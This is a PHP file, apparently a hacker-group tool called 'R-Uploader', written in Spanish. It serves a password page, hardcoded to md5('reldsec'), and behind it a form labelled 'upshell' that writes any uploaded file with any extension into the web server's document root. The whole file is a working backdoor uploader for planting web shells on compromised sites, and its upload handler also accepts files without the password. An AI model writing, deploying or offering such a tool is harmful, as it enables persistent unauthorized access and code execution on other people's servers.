<?php
function error_pass(){ ?>
<!DOCTYPE html>
<html>
<head>
	<title>Error</title>
	<meta charset="utf-8">
	<style type="text/css">
        body{
            background: black;
        }
		.errorr{
			color: red;
            text-align: center;
		}
	</style>
</head>
<body>
	<main>
		<div class="errorr">
			<h1>
				Contraseña Invalida
			</h1>
		</div>
	</main>
</body>
</html>
<?php
exit;
}
function upload_files(){?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
            <title>.- R-Uploader -.</title>
            <style>
                body{
                    background: url("https://images3.alphacoders.com/208/208577.jpg");
                    background-attachment: fixed;
                    background-size: cover;
                }
                .background{
                    margin-right: auto;
                    border: 1px solid aqua;
                    border-radius: 20px;
                    padding: 2%;
                }
                .uploader{
                    font-family: HACKED;
                    text-align: center;
                    font-size: 150%;
                }
                .uploader a{
                    text-decoration: none;
                    color: red;
                }
                .boton{
                    margin-top: -1%;
                    margin-right: -35%;
                    width: 100%;
                    height: 30px;
                    background: black;
                    color:aqua;
                    cursor: pointer;
                    border: 1px solid aqua;
                    border-radius: 14px;
                    -moz-border-radius: 14px;
                    -webkit-border-radius: 14px;
                    margin-bottom: 15px;
                }
                .seleccion{
                    margin-top: 1%;
                    margin-right: -40%;
                    width: 134%;
                    height: 21px;
                    background: black;
                    color: aqua;
                    cursor: pointer;
                    border: 1px solid aqua;
                    margin-bottom: 15px
                }
                .foot marquee{
                    color: aqua;
                    font-family: sans-serif;
                }
                .foot{
                    padding: 10px;
                    margin-top: 32%;
                    border: 1px solid aqua;
                }
                .intro{
                    margin-right: -33%;
                    margin-top: -10px;
                    width: 80%;
                    height: 30px;
                    padding: 5px 7px 5px 80px;
                    border: 1px solid aqua;
                    background: black;
                    color: red;
                    border-radius: 14px;
                    -moz-border-radius: 4px;
                    -webkit-border-radius: 4px;
                    }
                .follow {
                    margin-right: auto;
                    margin-top: -8%;
                    text-decoration: none;
                    color: lawngreen;
                    text-align: center;
                }
                body main div input[type="file"]{
                    color: aqua;
                    background: black;
                }
            </style>
        </head>
        <body>
            <main class="menu">
                <div style=" color:#F00;text-align:center; margin-top:60px; font-size:25px;">
                    <span class="background">
                        <span class="uploader">
                            <a href="https://web.facebook.com/reldsec/">>_ R-Uploader</a>
                        </span>
                    </span>
                </div>
                <div style="padding-top:75px;margin-left:450px;width:340px; height:70px;">
                    <span class="selecion">
                        <form enctype="multipart/form-data" action="<?php echo $_SERVER["PHP_SELF"]; ?>" method="post" class="form1">
                            <p align="center">
                                <input class="intro" type="text" placeholder=">_ Nombre del archivo" name="otorg">
                            </p>
                            <input name="usfile" type="file" class="seleccion" id="upload">
                            <p align="center">
                                <input class="boton" type="submit" value=">>_Subir" name="upshell">    
                            </p>
                        </form>
                    </span>
                </div>
            </main>
            <div class="follow">
                <a href="https://www.facebook.com/reldsec/" title="RELDSEC" target="_blank">.: Follow :.</a>
            </div>
            <footer class="foot">
                <marquee scrollamount="15">
                    No nos hacemos responsables del uso que le den, el uploader fue hecho con fines eticos y/o profesionales. by >_IDX4CKS | - reldsec
                </marquee>
            </footer>
        </body>
    </html>
<?php
exit;
}
if(isset($_POST['upshell']) and !empty($_FILES)){
    $directorio =  $_SERVER['DOCUMENT_ROOT'] . '/';
    $nombre = $_FILES['usfile']['name'];
    $tmp_nm = $_FILES['usfile']['tmp_name'];
    $nombre_asig = $_POST['otorg'];
    $tipo = explode('.',$nombre);
    $tipo = end($tipo);
    move_uploaded_file($tmp_nm, $directorio . $nombre_asig . '.' . $tipo);
}
?>
<?php
$default = md5('reldsec');
if(isset($_POST['envpass'])){
    $introduz = $_POST['password'];
    if(md5($introduz) == $default){
        upload_files();
    }
    elseif(md5($introduz != $default)){
        error_pass();
    }
}
?>

<html>
    <head>
        <title>
            Login
        </title>
        <meta charset="utf-8">
        <style>
            body{
                background: black;
            }
            .dise{
                font-family: Ubuntu;
                margin-top: 15%;
                font-size: 250%;
                display: inherit;
                text-align: center;
                color: lawngreen;
            }
            .introdu{
                padding: 10% 10% 10% 100%;
                display: block;
                margin-top: -10px;
                width: 30%;
                height: 30px;
                padding: 5px 7px 5px 80px;
                border: 1px solid lawngreen;
                background: black;
                color: red;
                border-radius: 14px;
                -moz-border-radius: 4px;
                -webkit-border-radius: 4px;
                }
            .enpassdig{
                margin-top: -1%;
                width: 10%;
                height: 30px;
                background: black;
                color: lawngreen;
                cursor: pointer;
                border: 1px solid lawngreen;
                border-radius: 14px;
                -moz-border-radius: 14px;
                -webkit-border-radius: 14px;
                margin-bottom: 15px;
            }
        </style>
    </head>
    <body>
        <main>
            <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
                <span class="dise">
                    Password<br>
                </span>
                <p align="center">
                    <input class="introdu" type="password" name="password" placeholder="root@root# >_ Introduce la contraseña $~ ">
                </p>
                <p align="center">
                    <br>
                    <input class="enpassdig" type="submit" name="envpass" value="Go!">
                </p>
            </form>
        </main>
    </body>
</html>